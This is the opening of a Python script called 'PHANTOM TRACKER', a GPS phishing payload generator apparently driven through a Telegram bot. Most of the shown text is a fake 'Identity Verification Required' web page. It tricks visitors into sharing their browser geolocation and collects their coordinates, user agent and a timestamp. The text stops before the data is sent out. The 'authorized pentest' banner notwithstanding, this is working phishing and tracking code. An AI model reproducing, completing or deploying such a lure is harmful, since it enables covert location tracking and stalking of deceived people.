#!/usr/bin/env python3
"""
PHANTOM TRACKER v1.0 - GPS Geolocation Phishing Payload Generator
Authorized Pentest Tool - DO NOT USE ILLEGALLY
"""

import sys, time, os, random, json, base64
from telethon import TelegramClient, events, Button

B = """
\033[1;31m╔══════════════════════════════════════════╗
║    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗ ║
║    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║ ║
║    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║ ║
║    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║ ║
║    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║ ║
║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ║
║     ░░░▒▒▒▓▓▓ TRACKER v1.0 ▓▓▓▒▒▒░░░                             ║
║     [ GPS PHISHING PAYLOAD GENERATOR ]                             ║
║     [ AUTHORIZED PENTEST TOOL ]                                    ║
╚══════════════════════════════════════════╝\033[0m
"""

GPS_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ 
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
    min-height: 100vh; display: flex; justify-content: center; align-items: center;
    color: #fff;
}}
.container {{
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 20px; padding: 40px; max-width: 420px; width: 90%;
    text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5);
}}
.logo {{ 
    width: 80px; height: 80px; background: linear-gradient(135deg, #e74c3c, #c0392b);
    border-radius: 50%; display: flex; align-items: center; justify-content: center;
    margin: 0 auto 20px; font-size: 36px; font-weight: bold; color: #fff;
    box-shadow: 0 0 30px rgba(231,76,60,0.3);
}}
h1 {{ font-size: 22px; margin-bottom: 8px; font-weight: 300; }}
h2 {{ font-size: 14px; color: #888; margin-bottom: 25px; font-weight: 300; }}
.btn {{
    background: linear-gradient(135deg, #e74c3c, #c0392b);
    color: #fff; border: none; padding: 14px 40px; font-size: 16px;
    border-radius: 50px; cursor: pointer; font-weight: 600;
    transition: all 0.3s; width: 100%; letter-spacing: 1px;
}}
.btn:hover {{ transform: translateY(-2px); box-shadow: 0 10px 30px rgba(231,76,60,0.4); }}
.btn:disabled {{ opacity: 0.6; cursor: not-allowed; transform: none; }}
.status {{ margin-top: 20px; font-size: 13px; color: #666; }}
.loader {{ display: none; width: 40px; height: 40px; margin: 15px auto; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #e74c3c; border-radius: 50%; animation: spin 1s linear infinite; }}
@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
<div class="container">
    <div class="logo">&#9881;</div>
    <h1>Identity Verification Required</h1>
    <h2>Your location must be verified to continue</h2>
    <div id="loader" class="loader"></div>
    <p id="status" class="status">Click verify to confirm your location</p>
    <button class="btn" id="verifyBtn" onclick="getLocation()">&#9679; VERIFY LOCATION</button>
</div>
<script>
function getLocation() {{
    document.getElementById('verifyBtn').disabled = true;
    document.getElementById('verifyBtn').innerHTML = '&#9679; VERIFYING...';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('status').innerHTML = 'Requesting GPS access...';
    
    if (!navigator.geolocation) {{
        document.getElementById('status').innerHTML = 'Geolocation not supported';
        document.getElementById('verifyBtn').disabled = false;
        document.getElementById('verifyBtn').innerHTML = '&#9679; VERIFY LOCATION';
        document.getElementById('loader').style.display = 'none';
        return;
    }}
    
    navigator.geolocation.getCurrentPosition(
        function(pos) {{
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            var acc = pos.coords.accuracy;
            var data = JSON.stringify({{
                lat: lat, lon: lon, acc: Math.round(acc),
                url: window.location.href,
                agent: navigator.userAgent,
                time: new Date().toISOString()
            }});
            document.getElementById('status').innerHTML = '✅ Verified!
